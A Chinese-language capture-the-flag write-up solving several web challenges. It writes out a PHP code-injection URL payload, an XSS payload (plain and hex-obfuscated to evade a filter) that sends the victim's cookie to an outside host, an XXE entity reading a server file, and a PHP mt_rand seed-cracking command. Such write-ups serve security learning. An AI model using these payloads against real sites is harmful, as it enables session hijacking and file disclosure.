# WEB

## web

re.php 划重点

```php
<?php
    $str = addslashes($_GET['shell']); 
    file_put_contents($path, "<?php \$shell='try to use this!';?>"); 
    $file = preg_replace('|\$shell=\'.*\';|',"\$shell='$str';",file_get_contents($path)); 
    file_put_contents($path,$file); 

    @print_r("<a href='$path'>$path</a></br>"); 
    @print_r(htmlspecialchars($file)); 
?> 
```

根据re.php的源代码，源码对于GET来的shell进行了addslashes，但是其实php自己本身就会对所有请求提交上来的变量进行addslashes操作，导致的结果就是，双次addslashes，反而将首次的addslashes无效化了。（笑）

于是构造字符串，即可拿到flag。

> http://10.105.42.5:44445/re.php?shell=../flag.php\%27;$tass=file_get_contents(substr($shell,0,11));%20var_dump($tass);%20//

-----

## SimpleShop

Reset password 会返回对应用户的 sid ，使用这个 sid 替换购买页面中的 sid 后，购买 flag 即可。

## SimpleShop2

在simple shop 1 中购买 talk to manager，得到一个 feedback 页面（get md5 应该是为了防止暴力注入 www 最开始不知道我还去查了半天这个开头的 md5 有啥）

### XSS

因为说manager will read it，判断这个是个XSS。根据尝试发现过滤了 ` . / script` 等文本

`foo.bar` 在 js 里大部分可以用 `foo["bar"]` 访问，这就好办多了不是么 23333

构造 xss 字符串

> <img src=x onerror=this.src='http://tsctf.henryzhao.org/a.jpg?c='+document["cookie"]>

对文字进行 encode

> <img src=x onerror=this["\x73\x72\x63"]='\x68\x74\x74\x70\x3a\x2f\x2f\x74\x73\x63\x74\x66\x2e\x68\x65\x6e\x72\x79\x7a\x68\x61\x6f\x2e\x6f\x72\x67\x2f\x61\x2e\x6a\x70\x67\x3f\x63\x3d'+window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"]>

成功拿到一个 PHPSESSIONID 的 cookie

### XXE

伪造cookie之后发现主页出现了一个 manager，随便提交点什么发现提交的时候是个 dom。经过询问谷歌老师，知道有个 XXE 漏洞，处理 xml 的时候可以越权访问奇怪的东西。

构造XML，成功读取到flag

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:////aaasssddd/flag" >
]>
<note><title>123</title><content>&xxe;</content></note>
```

-----

## 随机数

源代码审计，使用 `mt_srand()` 生成一个随机数种子，然后存下来第一个生成的随机数，再把第二个随机数的 md5 打出来。

反查 md5 后，使用 _php_mt_seed_ 跳过第一个随机数，按照第二个随机数去跑种子即可。

> $ OMP_NUM_THREADS=4 ./php_mt_seed 0 0 0 0 324679948

根据跑出来的种子，生成两个随机数，再用第一个的 md5 去访问即可。用 _action_ 去执行 `flag()` 函数。
这个时候，没有执行 `getkey()` ，所以那几个参数都是 `undefined` ，并且 `undefined == undefined` （笑）

（这不是 bug ，是 feature ！）
